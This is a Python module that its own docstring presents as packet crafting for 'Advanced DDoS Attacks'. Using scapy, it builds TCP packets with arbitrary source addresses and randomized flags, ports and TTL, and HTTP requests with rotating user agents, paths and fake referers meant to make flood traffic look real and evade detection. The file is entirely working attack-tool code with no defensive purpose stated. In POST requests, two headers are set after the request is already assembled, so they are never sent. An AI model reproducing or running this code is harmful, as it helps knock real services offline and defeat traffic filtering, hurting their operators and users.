"""
Packet Crafting Module for Advanced DDoS Attacks

This module provides sophisticated packet crafting capabilities
for creating realistic and evasive network traffic.
"""

import random
import logging
from scapy.all import IP, TCP, Raw

# Get the centralized attack logger
attack_logger = logging.getLogger('attack_logger')


class PacketCrafter:
    """Advanced packet crafting for realistic traffic generation."""
    
    def __init__(self):
        """Initialize packet crafter with realistic traffic patterns."""
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
        ]
        
        self.http_methods = ["GET", "POST", "HEAD", "OPTIONS"]
        self.http_paths = ["/", "/index.html", "/api/v1/users", "/products", 
                          "/login", "/static/css/main.css", "/images/banner.jpg"]
        
        # Common HTTP headers
        self.common_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0"
        }
    
    def craft_tcp_packet(self, src, dst, dport=80):
        """
        Craft a TCP packet with randomized attributes.
        
        Args:
            src: Source IP address
            dst: Destination IP address
            dport: Destination port (default: 80)
        
        Returns:
            Scapy packet object
        """
        seq = random.randint(1000, 9000000)
        sport = random.randint(1024, 65535)
        
        # Randomize TCP options and flags more intelligently
        flags = random.choice(["S", "SA", "A", "PA", "FA"])
        window = random.randint(8192, 65535)
        
        # Create packet with randomized TTL
        ttl = random.randint(48, 128)
        packet = IP(src=src, dst=dst, ttl=ttl)/TCP(sport=sport, dport=dport, 
                                                   seq=seq, window=window, flags=flags)
        attack_logger.debug(f"Crafted TCP packet: src={src}, dst={dst}, dport={dport}, flags={flags}, ttl={ttl}")
        return packet
    
    def craft_http_packet(self, src, dst, dport=80):
        """
        Craft an HTTP packet with realistic headers and content.
        
        Args:
            src: Source IP address
            dst: Destination IP address
            dport: Destination port (default: 80)
        
        Returns:
            Scapy packet object with HTTP payload
        """
        # Create base TCP packet
        base_packet = self.craft_tcp_packet(src, dst, dport)
        
        # Choose random HTTP method and path
        method = random.choice(self.http_methods)
        path = random.choice(self.http_paths)
        user_agent = random.choice(self.user_agents)
        
        # Create HTTP headers
        headers = dict(self.common_headers)
        headers["User-Agent"] = user_agent
        headers["Host"] = dst
        
        # Add a random referer sometimes
        if random.random() > 0.7:
            headers["Referer"] = f"https://{random.choice(['google.com', 'facebook.com', 'twitter.com'])}/search?q=products"
        
        # Format HTTP request
        http_request = f"{method} {path} HTTP/1.1\r\n"
        for header, value in headers.items():
            http_request += f"{header}: {value}\r\n"
        http_request += "\r\n"
        
        # Add body for POST requests
        if method == "POST":
            body = "param1=value1&param2=value2"
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Content-Length"] = str(len(body))
            http_request += body
        
        # Combine with payload
        packet = base_packet/Raw(load=http_request.encode())
        attack_logger.debug(f"Crafted HTTP packet: method={method}, path={path}, user_agent={user_agent}, host={dst}")
        return packet